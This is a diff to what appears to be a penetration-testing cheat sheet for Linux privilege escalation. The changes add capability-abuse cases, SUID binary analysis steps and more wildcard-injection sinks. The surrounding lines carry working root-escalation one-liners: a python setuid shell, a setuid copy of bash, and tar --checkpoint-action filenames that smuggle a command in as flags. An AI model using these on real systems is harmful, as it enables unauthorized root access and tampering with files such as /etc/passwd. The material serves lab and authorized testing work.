@@ -54,6 +54,9 @@ find / -perm -4000 -type f 2>/dev/null
   /usr/bin/python3 -c 'import os; os.setuid(0); os.system("id; /bin/bash -p")'
   # perl/node/ruby equivalents; vim/view with cap: :py3 import os;os.setuid(0);os.execl("/bin/sh","sh","-pc","reset; exec sh")
   ```
+  Also: `cap_dac_override` (e.g. on vim → read/WRITE any file, incl. /etc/passwd), `cap_dac_read_search`
+  (e.g. on tar → READ any file). Analyse an unknown SUID binary first: `ldd`, `strings`, `ltrace`, `strace`
+  (look for a relative-path `system()`/`exec*` call → PATH hijack, or a readable secret).
 - **Copy-root-bash primitive** (when you can run something as root that writes a file): `cp /bin/bash
   /tmp/rootbash && chmod +s /tmp/rootbash` then `/tmp/rootbash -p` (lab/benign proof; clean up the copy).
 
@@ -71,6 +74,8 @@ cat /etc/crontab; ls -la /etc/cron.*; systemctl list-timers --all
   echo "" > '--checkpoint=1'; echo "" > '--checkpoint-action=exec=sh shell.sh'
   # when the cron tar runs, it treats the filenames as flags → runs shell.sh as root. Clean up all three.
   ```
+  Other wildcard sinks: `rsync -e <cmd>`, `chown --reference=<file>`, `chmod --reference=<file>`,
+  `7z`/`zip` flag files — same "filename becomes a flag" trick.
 - **logrotten** (writable log rotated by root logrotte): compile `logrotten`, point a payload at the log →
   root exec on rotation. HIGH-touch; prefer only in lab / with approval.
 - **Writable `.service` / systemd unit** → set `ExecStart=` to a benign marker, `systemctl daemon-reload`
